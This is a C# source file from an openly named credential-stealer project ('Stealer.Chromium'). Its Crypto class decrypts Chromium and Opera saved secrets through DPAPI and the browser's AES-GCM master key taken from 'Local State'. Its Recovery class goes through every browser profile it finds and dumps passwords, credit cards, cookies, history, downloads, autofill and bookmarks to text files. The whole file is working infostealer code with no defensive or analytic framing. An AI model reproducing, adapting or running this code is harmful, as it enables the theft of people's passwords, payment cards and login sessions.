using System;
using System.IO;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace Stealer.Chromium
{
    internal sealed class Crypto
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CryptprotectPromptstruct
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DataBlob
        {
            public int cbData;
            public IntPtr pbData;
        }

        [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool CryptUnprotectData(ref DataBlob pCipherText, ref string pszDescription, ref DataBlob pEntropy, IntPtr pReserved, ref CryptprotectPromptstruct pPrompt, int dwFlags, ref DataBlob pPlainText);

        // Speed up decryption using master key
        private static string sPrevBrowserPath = "";
        private static byte[] sPrevMasterKey = new byte[] { };
        
        // Chrome < 80
        public static byte[] DPAPIDecrypt(byte[] bCipher, byte[] bEntropy = null)
        {
            DataBlob pPlainText = new DataBlob();
            DataBlob pCipherText = new DataBlob();
            DataBlob pEntropy = new DataBlob();

            CryptprotectPromptstruct pPrompt = new CryptprotectPromptstruct()
            {
                cbSize = Marshal.SizeOf(typeof(CryptprotectPromptstruct)),
                dwPromptFlags = 0,
                hwndApp = IntPtr.Zero,
                szPrompt = (string)null
            };

            string sEmpty = string.Empty;

            try
            {
                try
                {
                    if (bCipher == null)
                        bCipher = new byte[0];

                    pCipherText.pbData = Marshal.AllocHGlobal(bCipher.Length);
                    pCipherText.cbData = bCipher.Length;
                    Marshal.Copy(bCipher, 0, pCipherText.pbData, bCipher.Length);

                }
                catch { }

                try
                {
                    if (bEntropy == null)
                        bEntropy = new byte[0];

                    pEntropy.pbData = Marshal.AllocHGlobal(bEntropy.Length);
                    pEntropy.cbData = bEntropy.Length;

                    Marshal.Copy(bEntropy, 0, pEntropy.pbData, bEntropy.Length);

                }
                catch { }

                CryptUnprotectData(ref pCipherText, ref sEmpty, ref pEntropy, IntPtr.Zero, ref pPrompt, 1, ref pPlainText);

                byte[] bDestination = new byte[pPlainText.cbData];
                Marshal.Copy(pPlainText.pbData, bDestination, 0, pPlainText.cbData);
                return bDestination;

            }
            catch { }
            finally
            {
                if (pPlainText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pPlainText.pbData);

                if (pCipherText.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pCipherText.pbData);

                if (pEntropy.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(pEntropy.pbData);
            }
            return new byte[0];
        }
        // Chrome > 80
        public static byte[] GetMasterKey(string sLocalStateFolder)
        {

            string sLocalStateFile = sLocalStateFolder;

            if (sLocalStateFile.Contains("Opera"))
                sLocalStateFile += "\\Opera Stable\\Local State";
            else
                sLocalStateFile += "\\Local State";

            byte[] bMasterKey = new byte[] { };

            if (!File.Exists(sLocalStateFile))
                return null;

            // Ну карочи так быстрее работает, да
            if (sLocalStateFile != sPrevBrowserPath)
                sPrevBrowserPath = sLocalStateFile;
            else
                return sPrevMasterKey;
            

            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"",
                System.Text.RegularExpressions.RegexOptions.Compiled).Matches(
                File.ReadAllText(sLocalStateFile));
            foreach (System.Text.RegularExpressions.Match prof in pattern)
            {
                if (prof.Success)
                    bMasterKey = Convert.FromBase64String(prof.Groups[1].Value);
            }


            byte[] bRawMasterKey = new byte[bMasterKey.Length - 5];
            Array.Copy(bMasterKey, 5, bRawMasterKey, 0, bMasterKey.Length - 5);

            try
            {
                sPrevMasterKey = DPAPIDecrypt(bRawMasterKey);
                return sPrevMasterKey;
            } catch { return null; }
        }

        public static string GetUTF8(string sNonUtf8)
        {
            try
            {
                byte[] bData = Encoding.Default.GetBytes(sNonUtf8);
                return Encoding.UTF8.GetString(bData);
            }
            catch { return sNonUtf8; }
        }



        public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
        {
            byte[] bIV = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
            Array.Copy(bEncryptedData, 3, bIV, 0, 12);

            try
            {

                byte[] bBuffer = new byte[bEncryptedData.Length - 15];
                Array.Copy(bEncryptedData, 15, bBuffer, 0, bEncryptedData.Length - 15);
                byte[] bTag = new byte[16];
                byte[] bData = new byte[bBuffer.Length - bTag.Length];
                Array.Copy(bBuffer, bBuffer.Length - 16, bTag, 0, 16);
                Array.Copy(bBuffer, 0, bData, 0, bBuffer.Length - bTag.Length);
                cAesGcm aDecryptor = new cAesGcm();
                return aDecryptor.Decrypt(bMasterKey, bIV, null, bData, bTag);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                return null;
            }
        }

        public static string EasyDecrypt(string sLoginData, string sPassword)
        {
            if (sPassword.StartsWith("v10") || sPassword.StartsWith("v11"))
            {
                byte[] bMasterKey = GetMasterKey(Directory.GetParent(sLoginData).Parent.FullName);
                return Encoding.Default.GetString(DecryptWithKey(Encoding.Default.GetBytes(sPassword), bMasterKey));
            }
            else
                return Encoding.Default.GetString(DPAPIDecrypt(Encoding.Default.GetBytes(sPassword)));
        }

        public static string BrowserPathToAppName(string sLoginData)
        {
            if (sLoginData.Contains("Opera")) return "Opera";
            sLoginData.Replace(Paths.lappdata, "");
            return sLoginData.Split('\\')[1];
        }
    }

    // Stealer
    internal sealed class Recovery
    {
        public static void Run(string sSavePath)
        {
            if (!Directory.Exists(sSavePath))
                Directory.CreateDirectory(sSavePath);

            foreach (string sPath in Paths.sChromiumPswPaths)
            {
                string sFullPath;
                if (sPath.Contains("Opera Software"))
                    sFullPath = Paths.appdata + sPath;
                else
                    sFullPath = Paths.lappdata + sPath;

                if (Directory.Exists(sFullPath)) foreach (string sProfile in Directory.GetDirectories(sFullPath))
                    {
                        // Write chromium passwords, credit cards, cookies
                        string sBDir = sSavePath + "\\" + Crypto.BrowserPathToAppName(sPath);
                        Directory.CreateDirectory(sBDir);
                        // Run tasks
                        List<CreditCard> pCreditCards = CreditCards.Get(sProfile + "\\Web Data");
                        List<Password> pPasswords = Passwords.Get(sProfile + "\\Login Data");
                        List<Cookie> pCookies = Cookies.Get(sProfile + "\\Cookies");
                        List<Site> pHistory = History.Get(sProfile + "\\History");
                        List<Site> pDownloads = Downloads.Get(sProfile + "\\History");
                        List<AutoFill> pAutoFill = Autofill.Get(sProfile + "\\Web Data");
                        List<Bookmark> pBookmarks = Bookmarks.Get(sProfile + "\\Bookmarks");
                        // Await values and write
                        cBrowserUtils.WriteCreditCards(pCreditCards, sBDir + "\\CreditCards.txt");
                        cBrowserUtils.WritePasswords(pPasswords, sBDir + "\\Passwords.txt");
                        cBrowserUtils.WriteCookies(pCookies, sBDir + "\\Cookies.txt");
                        cBrowserUtils.WriteHistory(pHistory, sBDir + "\\History.txt");
                        cBrowserUtils.WriteHistory(pDownloads, sBDir + "\\Downloads.txt");
                        cBrowserUtils.WriteAutoFill(pAutoFill, sBDir + "\\AutoFill.txt");
                        cBrowserUtils.WriteBookmarks(pBookmarks, sBDir + "\\Bookmarks.txt");
                    }
            }
        }

    }
}
